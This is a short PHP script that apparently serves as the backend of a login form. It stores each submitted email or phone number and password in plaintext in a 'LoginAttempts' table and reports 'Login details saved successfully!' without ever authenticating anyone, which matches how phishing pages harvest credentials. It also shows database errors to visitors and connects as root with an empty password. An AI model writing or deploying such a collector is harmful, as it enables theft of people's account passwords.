<?php
// Enable error reporting for debugging
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Database connection
$conn = new mysqli('localhost', 'root', '', 'userauthentication');
if ($conn->connect_error) {
    die("Database connection failed: " . $conn->connect_error);
}

// Check if form data is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Fetch login data
    $email_or_phone = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // Validate input
    if (empty($email_or_phone) || empty($password)) {
        die("Email/Phone and Password are required.");
    }

    // Insert login attempt into the database
    $sql = "INSERT INTO LoginAttempts (email_or_phone, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);

    if (!$stmt) {
        die("Query preparation failed: " . $conn->error);
    }

    $stmt->bind_param("ss", $email_or_phone, $password);
    if ($stmt->execute()) {
        echo "Login details saved successfully!";
    } else {
        echo "Error saving login details: " . $stmt->error;
    }

    $stmt->close();
} else {
    echo "Form not submitted.";
}

$conn->close();
?>
